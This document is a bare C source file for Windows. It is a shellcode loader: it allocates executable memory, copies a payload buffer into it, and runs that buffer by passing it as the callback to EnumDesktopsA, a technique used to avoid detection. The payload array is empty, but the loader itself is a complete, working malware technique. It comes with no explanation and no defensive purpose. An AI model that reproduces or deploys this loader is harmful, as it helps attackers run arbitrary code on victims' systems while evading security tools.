#include <windows.h>

unsigned char my_payload[] = "";

int main(int argc, char* argv[])
{
	LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(mem, my_payload, sizeof(my_payload));
	EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
	return 0;
}